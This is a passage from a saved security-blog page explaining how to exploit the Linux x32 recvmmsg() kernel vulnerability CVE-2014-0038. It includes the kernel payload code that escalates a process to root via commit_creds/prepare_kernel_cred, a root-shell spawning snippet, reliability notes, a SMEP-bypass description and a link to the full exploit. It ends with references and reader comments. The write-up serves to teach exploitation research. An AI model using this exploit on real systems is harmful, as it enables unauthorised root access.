    _commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
    _prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;
    /* restore function pointer and following two longs */
    *((int*)(PTMX_FOPS + FOPS_RELEASE_OFFSET + 4)) = -1;
    *((long*)(PTMX_FOPS + FOPS_RELEASE_OFFSET + 8)) = 0;
    *((long*)(PTMX_FOPS + FOPS_RELEASE_OFFSET + 16)) = 0;
    /* escalate to root */
    commit_creds(prepare_kernel_cred(0));
    return -1;
}</div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">int __attribute__((regparm(3)))
kernel_payload(void* foo, void* bar)
{
    _commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
    _prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;
    /* restore function pointer and following two longs */
    *((int*)(PTMX_FOPS + FOPS_RELEASE_OFFSET + 4)) = -1;
    *((long*)(PTMX_FOPS + FOPS_RELEASE_OFFSET + 8)) = 0;
    *((long*)(PTMX_FOPS + FOPS_RELEASE_OFFSET + 16)) = 0;
    /* escalate to root */
    commit_creds(prepare_kernel_cred(0));
    return -1;
}</pre>
<p>This is the function copied into the end of the allocated buffer at the beginning. The kernel will execute this code during the close syscall and then return back to user space. The kernel payload uses an old approach which has been documented by Brad Spengler (Spender) in his enlightenment framework [4] (see exploit.c).</p>
<p>Basically, after restoring the manipulated memory region, a new cred structure with full privileges is allocated by prepare_kernel_cred and afterwards passed to commit_creds to install it upon the current task. Since the exploit needs to resolve the tty_release and ptmx_fops symbols anyways this approach was chosen.</p>
<p>It would also be possible to change the credentials without calling any helper functions in the kernel.<br>
This can be done by looking for a pointer to the cred structure stored in the task_struct for the current process, which can in turn be found at the beginning of the kernel stack.<br>
By searching for memory that contains the current process uid and gid and setting those to zero, root privileges can be acquired as well.<br>
For an example demonstrating this technique refer to the semtex.c exploit [5].</p>
<h3>Finishing</h3>
<div class="enlighter-default enlighter-v-standard enlighter-t-droide "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-m0">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-m0">getuid</span><span class="enlighter-g1">()</span><span class="enlighter-text"> != </span><span class="enlighter-n1">0</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"failed to get root :(\n"</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">exit</span><span class="enlighter-g1">(</span><span class="enlighter-text">EXIT_FAILURE</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"got root, enjoy :)\n"</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k1">return</span><span class="enlighter-text"> </span><span class="enlighter-m0">execl</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"/bin/bash"</span><span class="enlighter-text">, </span><span class="enlighter-s0">"-sh"</span><span class="enlighter-text">, </span><span class="enlighter-k1">NULL</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div></div><div class="enlighter-raw">if (getuid() != 0) {
    printf("failed to get root :(\n");
    exit(EXIT_FAILURE);
}
printf("got root, enjoy :)\n");
return execl("/bin/bash", "-sh", NULL);</div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">if (getuid() != 0) {
    printf("failed to get root :(\n");
    exit(EXIT_FAILURE);
}
printf("got root, enjoy :)\n");
return execl("/bin/bash", "-sh", NULL);</pre>
<h3>Some notes on reliability</h3>
<p>Since the exploit relies on timing it might be unreliable if the exploited system is under <b>very</b> heavy load.<br>
If the kernel fails to reschedule the child process to wake up its parent on time (meaning within a second) the pointer will get corrupted and the exploit will fail, causing a kernel Oops.<br>
In this case a non-threaded exploit which clears the bytes sequentially can be used. You’d want to wait 255 seconds for each byte and this guarantees that the whole timespec structure will be zeroed out when waking up the parent. This approach takes 3 times longer as the parallel version though, so approximately 13 minutes [6]. I have tested the parallel version on a system under heavy load (100% CPU usage) multiple times and have not seen the exploit fail, so I assume this to be more of a theoretical issue (setting up the sockets and rescheduling a process within one second is really no big deal, even under stress).</p>
<p>The original non-threaded version of this exploit in theory works reliably vs. the threaded version, but does take a while to execute.</p>
<h3>Exploit restrictions</h3>
<p>Since the exploit tricks the kernel into executing user space pages it can be stopped by SMEP [7]. SMEP will cause the CPU to generate a fault if it is executing code from a user space page in kernel mode. Think of SMEP as kind of a DEP/NX for the kernel. To bypass SMEP the 20th bit of CR4 can be cleared through a ROP chain. Afterwards executing code in user space is possible. This technique is described in further detail in [8]. If no gadgets can be found for writing to the CR4 register exploitation would still be possible by writing the payload in ROP entirely.<br>
Also see the post in [9].</p>
<p>That’s it, find the full proof-of-concept exploit code at:<br>
<a href="https://github.com/saelo/cve-2014-0038">https://github.com/saelo/cve-2014-0038</a></p>
<p>If you have interesting optimizations or alternative implementations let us know via email info/atincludesecurity.com</p>
<h3>References</h3>
<p>[1] <a href="http://seclists.org/oss-sec/2014/q1/187">http://seclists.org/oss-sec/2014/q1/187</a><br>
[2] <a href="http://en.wikipedia.org/wiki/x32_ABI">http://en.wikipedia.org/wiki/x32_ABI</a><br>
[3] <a href="http://www.phrack.org/issues.html?id=6&amp;issue=64">http://www.phrack.org/issues.html?id=6&amp;issue=64</a><br>
[4] <a href="http://grsecurity.net/~spender/exploits/enlightenment.tgz">http://grsecurity.net/~spender/exploits/enlightenment.tgz</a><br>
[5] <a href="http://packetstormsecurity.com/files/121616/semtex.c">http://packetstormsecurity.com/files/121616/semtex.c</a><br>
[6] <a href="http://pastebin.com/DH3Lbg54">http://pastebin.com/DH3Lbg54</a><br>
[7] <a href="http://en.wikipedia.org/wiki/Control_register#CR4">http://en.wikipedia.org/wiki/Control_register#CR4</a><br>
[8] <a href="http://blog.ptsecurity.com/2012/09/bypassing-intel-smep-on-windows-8-x64.html">http://blog.ptsecurity.com/2012/09/bypassing-intel-smep-on-windows-8-x64.html</a><br>
[9] <a href="http://vulnfactory.org/blog/2011/06/05/smep-what-is-it-and-how-to-beat-it-on-linux">http://vulnfactory.org/blog/2011/06/05/smep-what-is-it-and-how-to-beat-it-on-linux</a></p>
<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul data-sharing-events-added="true"><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-189" class="share-twitter sd-button share-icon" href="https://blog.includesecurity.com/2014/03/how-to-exploit-the-x32-recvmmsg-kernel-vulnerability-cve-2014-0038/?share=twitter&amp;nb=1" target="_blank" title="Click to share on Twitter"><span>Twitter</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-189" class="share-facebook sd-button share-icon" href="https://blog.includesecurity.com/2014/03/how-to-exploit-the-x32-recvmmsg-kernel-vulnerability-cve-2014-0038/?share=facebook&amp;nb=1" target="_blank" title="Click to share on Facebook"><span>Facebook</span></a></li><li class="share-end"></li></ul></div></div></div><div class="sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-unloaded" id="like-post-wrapper-145744988-189-61a900ef4e90e" data-src="https://widgets.wp.com/likes/#blog_id=145744988&amp;post_id=189&amp;origin=blog.includesecurity.com&amp;obj_id=145744988-189-61a900ef4e90e" data-name="like-post-frame-145744988-189-61a900ef4e90e" data-title="Like or Reblog"><h3 class="sd-title">Like this:</h3><div class="likes-widget-placeholder post-likes-widget-placeholder" style="height: 55px;"><span class="button"><span>Like</span></span> <span class="loading">Loading...</span></div><span class="sd-text-color"></span><a class="sd-link-color"></a></div>		</div>

				<footer class="entry-meta">
			<span class="cat-links"><span class="gp-icon icon-categories"><svg viewBox="0 0 512 512" aria-hidden="true" role="img" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="1em" height="1em">
						<path d="M0 112c0-26.51 21.49-48 48-48h110.014a48 48 0 0 1 43.592 27.907l12.349 26.791A16 16 0 0 0 228.486 128H464c26.51 0 48 21.49 48 48v224c0 26.51-21.49 48-48 48H48c-26.51 0-48-21.49-48-48V112z" fill-rule="nonzero"></path>
					</svg></span><span class="screen-reader-text">Categories </span><a href="https://blog.includesecurity.com/category/exploit/" rel="category tag">Exploit</a>, <a href="https://blog.includesecurity.com/category/kernel-exploit/" rel="category tag">Kernel Exploit</a>, <a href="https://blog.includesecurity.com/category/linux/" rel="category tag">Linux</a>, <a href="https://blog.includesecurity.com/category/privilege-escalation/" rel="category tag">privilege escalation</a>, <a href="https://blog.includesecurity.com/category/recvmmsg/" rel="category tag">recvmmsg</a></span> 		<nav id="nav-below" class="post-navigation">
			<span class="screen-reader-text">Post navigation</span>

			<div class="nav-previous"><span class="gp-icon icon-arrow-left"><svg viewBox="0 0 192 512" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414">
						<path d="M178.425 138.212c0 2.265-1.133 4.813-2.832 6.512L64.276 256.001l111.317 111.277c1.7 1.7 2.832 4.247 2.832 6.513 0 2.265-1.133 4.813-2.832 6.512L161.43 394.46c-1.7 1.7-4.249 2.832-6.514 2.832-2.266 0-4.816-1.133-6.515-2.832L16.407 262.514c-1.699-1.7-2.832-4.248-2.832-6.513 0-2.265 1.133-4.813 2.832-6.512l131.994-131.947c1.7-1.699 4.249-2.831 6.515-2.831 2.265 0 4.815 1.132 6.514 2.831l14.163 14.157c1.7 1.7 2.832 3.965 2.832 6.513z" fill-rule="nonzero"></path>
					</svg></span><span class="prev" title="Previous"><a href="https://blog.includesecurity.com/2014/02/how-i-was-able-to-track-the-location-of-any-tinder-user/" rel="prev">How I was able to track the location of any Tinder user.</a></span></div><div class="nav-next"><span class="gp-icon icon-arrow-right"><svg viewBox="0 0 192 512" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414">
						<path d="M178.425 256.001c0 2.266-1.133 4.815-2.832 6.515L43.599 394.509c-1.7 1.7-4.248 2.833-6.514 2.833s-4.816-1.133-6.515-2.833l-14.163-14.162c-1.699-1.7-2.832-3.966-2.832-6.515 0-2.266 1.133-4.815 2.832-6.515l111.317-111.316L16.407 144.685c-1.699-1.7-2.832-4.249-2.832-6.515s1.133-4.815 2.832-6.515l14.163-14.162c1.7-1.7 4.249-2.833 6.515-2.833s4.815 1.133 6.514 2.833l131.994 131.993c1.7 1.7 2.832 4.249 2.832 6.515z" fill-rule="nonzero"></path>
					</svg></span><span class="next" title="Next"><a href="https://blog.includesecurity.com/2014/03/reversing-the-dropcam-part-1-wireless-and-network-communications/" rel="next">Reversing the Dropcam Part 1: Wireless and network communications</a></span></div>		</nav>
				</footer>
			</div>
</article>

			<div class="comments-area">
				<div id="comments">

	<h3 class="comments-title">2 thoughts on “How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038”</h3>
		<ol class="comment-list">
			
		<li id="comment-67" class="comment even thread-even depth-1">
			<article id="div-comment-67" class="comment-body" itemtype="https://schema.org/Comment" itemscope="">
				<footer class="comment-meta">
					<img alt="" src="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/41dc3e007986c35dc46763689fa93174" srcset="https://secure.gravatar.com/avatar/41dc3e007986c35dc46763689fa93174?s=100&amp;d=identicon&amp;r=g 2x" class="avatar avatar-50 photo grav-hashed grav-hijack" height="50" width="50" loading="lazy" id="grav-41dc3e007986c35dc46763689fa93174-0">					<div class="comment-author-info">
						<div class="comment-author vcard" itemprop="author" itemtype="https://schema.org/Person" itemscope="">
							<cite itemprop="name" class="fn"><a href="https://www.blogger.com/profile/07982831495608351527" rel="external nofollow ugc" class="url">Pwntoken</a></cite>						</div>

						<div class="entry-meta comment-metadata">
							<a href="https://blog.includesecurity.com/2014/03/how-to-exploit-the-x32-recvmmsg-kernel-vulnerability-cve-2014-0038/#comment-67">
								<time datetime="2014-11-27T13:26:51-05:00" itemprop="datePublished">
									November 27, 2014 at 1:26 pm								</time>
							</a>
													</div>
					</div>

									</footer>

				<div class="comment-content" itemprop="text">
					<p>In love with Kernel Exploitation, there are restrictions to this tho. The first long at the passed address (tv_sec) has to be positive and the second long (tv_nsec) has to be smaller than 1000000000.</p>
<div class="jetpack-comment-likes-widget-wrapper jetpack-likes-widget-loaded" id="like-comment-wrapper-145744988-67-61a900ef50c25" data-src="https://widgets.wp.com/likes/#blog_id=145744988&amp;comment_id=67&amp;origin=blog.includesecurity.com&amp;obj_id=145744988-67-61a900ef50c25" data-name="like-comment-frame-145744988-67-61a900ef50c25">
<div class="likes-widget-placeholder comment-likes-widget-placeholder comment-likes" style="display: none;"><span class="loading">Loading...</span></div>
<div class="comment-likes-widget jetpack-likes-widget comment-likes"><span class="comment-like-feedback"></span><iframe name="like-comment-frame-145744988-67-61a900ef50c25" src="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/saved_resource.html" height="18px" width="100%" frameborder="0" scrolling="no"></iframe><span class="sd-text-color"></span><a class="sd-link-color"></a></div>
</div>
<span class="reply"><a rel="nofollow" class="comment-reply-link" href="https://blog.includesecurity.com/2014/03/how-to-exploit-the-x32-recvmmsg-kernel-vulnerability-cve-2014-0038/#comment-67" data-commentid="67" data-postid="189" data-belowelement="div-comment-67" data-respondelement="respond" data-replyto="Reply to Pwntoken" aria-label="Reply to Pwntoken">Reply</a></span>				</div>
			</article>
			</li><!-- #comment-## -->

		<li id="comment-8" class="comment odd alt thread-odd thread-alt depth-1">
			<article id="div-comment-8" class="comment-body" itemtype="https://schema.org/Comment" itemscope="">
				<footer class="comment-meta">
					<img alt="" src="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/41dc3e007986c35dc46763689fa93174" srcset="https://secure.gravatar.com/avatar/41dc3e007986c35dc46763689fa93174?s=100&amp;d=identicon&amp;r=g 2x" class="avatar avatar-50 photo grav-hashed grav-hijack" height="50" width="50" loading="lazy" id="grav-41dc3e007986c35dc46763689fa93174-1">					<div class="comment-author-info">
						<div class="comment-author vcard" itemprop="author" itemtype="https://schema.org/Person" itemscope="">
							<cite itemprop="name" class="fn"><a href="https://www.blogger.com/profile/17228019702479124330" rel="external nofollow ugc" class="url">MistoJ</a></cite>						</div>

						<div class="entry-meta comment-metadata">
							<a href="https://blog.includesecurity.com/2014/03/how-to-exploit-the-x32-recvmmsg-kernel-vulnerability-cve-2014-0038/#comment-8">
								<time datetime="2017-05-05T11:07:50-04:00" itemprop="datePublished">
									May 5, 2017 at 11:07 am								</time>
							</a>
													</div>
					</div>

									</footer>

				<div class="comment-content" itemprop="text">
					<p>Hi,</p>
<p>Very interesting article. I am trying to reproduce your exploit on ubuntu-13.10, but it does not allow me to. The program output is:</p>
<p>vagrant@vagrant:~/cve-2014-0038$ cat /proc/kallsyms &gt; syms.txt &amp;&amp; ./build.sh &amp;&amp; ./timeoutpwn<br>Invalid address, try grabbing System.map</p>
<p>Could you please tell me, what could have been gone wrong?</p>
<p>Thanks,</p>
<p>Viet</p>
<div class="jetpack-comment-likes-widget-wrapper jetpack-likes-widget-loaded" id="like-comment-wrapper-145744988-8-61a900ef51366" data-src="https://widgets.wp.com/likes/#blog_id=145744988&amp;comment_id=8&amp;origin=blog.includesecurity.com&amp;obj_id=145744988-8-61a900ef51366" data-name="like-comment-frame-145744988-8-61a900ef51366">
<div class="likes-widget-placeholder comment-likes-widget-placeholder comment-likes" style="display: none;"><span class="loading">Loading...</span></div>
<div class="comment-likes-widget jetpack-likes-widget comment-likes"><span class="comment-like-feedback"></span><iframe name="like-comment-frame-145744988-8-61a900ef51366" src="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/saved_resource(5).html" height="18px" width="100%" frameborder="0" scrolling="no"></iframe><span class="sd-text-color"></span><a class="sd-link-color"></a></div>
</div>
<span class="reply"><a rel="nofollow" class="comment-reply-link" href="https://blog.includesecurity.com/2014/03/how-to-exploit-the-x32-recvmmsg-kernel-vulnerability-cve-2014-0038/#comment-8" data-commentid="8" data-postid="189" data-belowelement="div-comment-8" data-respondelement="respond" data-replyto="Reply to MistoJ" aria-label="Reply to MistoJ">Reply</a></span>				</div>
			</article>
			</li><!-- #comment-## -->
		</ol><!-- .comment-list -->

		
		<div id="respond" class="comment-respond">
							<h3 id="reply-title" class="comment-reply-title">Leave a Reply					<small><a rel="nofollow" id="cancel-comment-reply-link" href="https://blog.includesecurity.com/2014/03/how-to-exploit-the-x32-recvmmsg-kernel-vulnerability-cve-2014-0038/#respond" style="display:none;">Cancel reply</a></small>
				</h3>
						<form id="commentform" class="comment-form">
				<iframe title="Comment Form" src="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/saved_resource(6).html" name="jetpack_remote_comment" style="width: 100%; height: 58.2px; border: 0px;" class="jetpack_remote_comment" id="jetpack_remote_comment" sandbox="allow-same-origin allow-top-navigation allow-scripts allow-forms allow-popups" scrolling="no">
									</iframe>
									<!--[if !IE]><!-->
					<script>
						document.addEventListener('DOMContentLoaded', function () {
							var commentForms = document.getElementsByClassName('jetpack_remote_comment');
							for (var i = 0; i < commentForms.length; i++) {
								commentForms[i].allowTransparency = false;
								commentForms[i].scrolling = 'no';
							}
						});
					</script>
					<!--<![endif]-->
							</form>
		</div>

		
		<input type="hidden" name="comment_parent" id="comment_parent" value="">

		
</div><!-- #comments -->
			</div>

					</main>
	</div>

	
	</div>
</div>



<!--  -->
<script defer="" id="bilmur" data-provider="wordpress.com" data-service="atomic" src="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/bilmur.min.js.下載"></script>
	<div style="display:none">
	<div class="grofile-hash-map-41dc3e007986c35dc46763689fa93174">
	</div>
	</div>

	<script type="text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/blog.includesecurity.com\/2014\/03\/how-to-exploit-the-x32-recvmmsg-kernel-vulnerability-cve-2014-0038\/":189};
	</script>
				<script src="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/photon.min.js.下載" id="jetpack-photon-js"></script>
<script src="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/gprofiles.js.下載" id="grofiles-cards-js"></script>
<script id="wpgroho-js-extra">
var WPGroHo = {"my_hash":""};
</script>
<script src="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/wpgroho.js.下載" id="wpgroho-js"></script>
<!--[if lte IE 11]>
<script src='https://blog.includesecurity.com/wp-content/themes/generatepress/assets/js/classList.min.js?ver=3.0.2' id='generate-classlist-js'></script>
<![endif]-->
<script id="generate-main-js-extra">
var generatepressMenu = {"toggleOpenedSubMenus":"1","openSubMenuLabel":"Open Sub-Menu","closeSubMenuLabel":"Close Sub-Menu"};
</script>
<script src="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/main.min.js.下載" id="generate-main-js"></script>
<script src="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/comment-reply.min.js.下載" id="comment-reply-js"></script>
<script src="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/queuehandler.min.js.下載" id="jetpack_likes_queuehandler-js"></script>
<script src="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/enlighterjs.min.js.下載" id="enlighterjs-js"></script>
<script id="enlighterjs-js-after">
!function(e,n){if("undefined"!=typeof EnlighterJS){var o={"selectors":{"block":"pre.EnlighterJSRAW","inline":"code.EnlighterJSRAW"},"options":{"indent":4,"ampersandCleanup":true,"linehover":false,"rawcodeDbclick":false,"textOverflow":"break","linenumbers":false,"theme":"droide","language":"generic","retainCssClasses":false,"collapse":false,"toolbarOuter":"","toolbarTop":"{BTN_RAW}{BTN_COPY}{BTN_WINDOW}{BTN_WEBSITE}","toolbarBottom":""}};(e.EnlighterJSINIT=function(){EnlighterJS.init(o.selectors.block,o.selectors.inline,o.options)})()}else{(n&&(n.error||n.log)||function(){})("Error: EnlighterJS resources not loaded yet!")}}(window,console);
</script>
<script src="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/wp-embed.min.js.下載" id="wp-embed-js"></script>
<script id="sharing-js-js-extra">
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
</script>
<script async="true" src="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/saved_resource"></script><script src="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/sharing.min.js.下載" id="sharing-js-js"></script>
<script id="sharing-js-js-after">
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-twitter' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-facebook' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
						return false;
					}
				} );
			} )();
</script>
	<iframe src="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/master.html" scrolling="no" id="likes-master" name="likes-master" style="display:none;"></iframe>
	<div id="likes-other-gravatars"><div class="likes-text"><span>%d</span> bloggers like this:</div><ul class="wpl-avatars sd-like-gravatars"></ul></div>
	
		<!--[if IE]>
		<script type="text/javascript">
			if ( 0 === window.location.hash.indexOf( '#comment-' ) ) {
				// window.location.reload() doesn't respect the Hash in IE
				window.location.hash = window.location.hash;
			}
		</script>
		<![endif]-->
		<script type="text/javascript">
			(function () {
				var comm_par_el = document.getElementById( 'comment_parent' ),
					comm_par = ( comm_par_el && comm_par_el.value ) ? comm_par_el.value : '',
					frame = document.getElementById( 'jetpack_remote_comment' ),
					tellFrameNewParent;

				tellFrameNewParent = function () {
					if ( comm_par ) {
						frame.src = "https://jetpack.wordpress.com/jetpack-comment/?blogid=145744988&postid=189&comment_registration=0&require_name_email=1&stc_enabled=1&stb_enabled=1&show_avatars=1&avatar_default=identicon&greeting=Leave+a+Reply&greeting_reply=Leave+a+Reply+to+%25s&color_scheme=light&lang=en_US&jetpack_version=10.4-beta&show_cookie_consent=10&has_cookie_consent=0&token_key=%3Bnormal%3B&sig=568f79af05d9bb808b6654b6c2f957eb5a923355#parent=https%3A%2F%2Fblog.includesecurity.com%2F2014%2F03%2Fhow-to-exploit-the-x32-recvmmsg-kernel-vulnerability-cve-2014-0038%2F" + '&replytocom=' + parseInt( comm_par, 10 ).toString();
					} else {
						frame.src = "https://jetpack.wordpress.com/jetpack-comment/?blogid=145744988&postid=189&comment_registration=0&require_name_email=1&stc_enabled=1&stb_enabled=1&show_avatars=1&avatar_default=identicon&greeting=Leave+a+Reply&greeting_reply=Leave+a+Reply+to+%25s&color_scheme=light&lang=en_US&jetpack_version=10.4-beta&show_cookie_consent=10&has_cookie_consent=0&token_key=%3Bnormal%3B&sig=568f79af05d9bb808b6654b6c2f957eb5a923355#parent=https%3A%2F%2Fblog.includesecurity.com%2F2014%2F03%2Fhow-to-exploit-the-x32-recvmmsg-kernel-vulnerability-cve-2014-0038%2F";
					}
				};

				
				if ( 'undefined' !== typeof addComment ) {
					addComment._Jetpack_moveForm = addComment.moveForm;

					addComment.moveForm = function ( commId, parentId, respondId, postId ) {
						var returnValue = addComment._Jetpack_moveForm( commId, parentId, respondId, postId ),
							cancelClick, cancel;

						if ( false === returnValue ) {
							cancel = document.getElementById( 'cancel-comment-reply-link' );
							cancelClick = cancel.onclick;
							cancel.onclick = function () {
								var cancelReturn = cancelClick.call( this );
								if ( false !== cancelReturn ) {
									return cancelReturn;
								}

								if ( ! comm_par ) {
									return cancelReturn;
								}

								comm_par = 0;

								tellFrameNewParent();

								return cancelReturn;
							};
						}

						if ( comm_par == parentId ) {
							return returnValue;
						}

						comm_par = parentId;

						tellFrameNewParent();

						return returnValue;
					};
				}

				
				// Do the post message bit after the dom has loaded.
				document.addEventListener( 'DOMContentLoaded', function () {
					var iframe_url = "https:\/\/jetpack.wordpress.com";
					if ( window.postMessage ) {
						if ( document.addEventListener ) {
							window.addEventListener( 'message', function ( event ) {
								var origin = event.origin.replace( /^http:\/\//i, 'https://' );
								if ( iframe_url.replace( /^http:\/\//i, 'https://' ) !== origin ) {
									return;
								}
								frame.style.height = event.data + 'px';
							});
						} else if ( document.attachEvent ) {
							window.attachEvent( 'message', function ( event ) {
								var origin = event.origin.replace( /^http:\/\//i, 'https://' );
								if ( iframe_url.replace( /^http:\/\//i, 'https://' ) !== origin ) {
									return;
								}
								frame.style.height = event.data + 'px';
							});
						}
					}
				})

			})();
		</script>

		<script src="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/e-202148.js.下載" defer=""></script>
<script>
	_stq = window._stq || [];
	_stq.push([ 'view', {v:'ext',j:'1:10.4-beta',blog:'145744988',post:'189',tz:'-5',srv:'blog.includesecurity.com'} ]);
	_stq.push([ 'clickTrackerInit', '145744988', '189' ]);
</script>



<img src="./2014 - How to exploit the x32 recvmmsg() kernel vulnerability CVE 2014-0038_files/g.gif" alt="" width="6" height="5" id="wpstats"></body></html>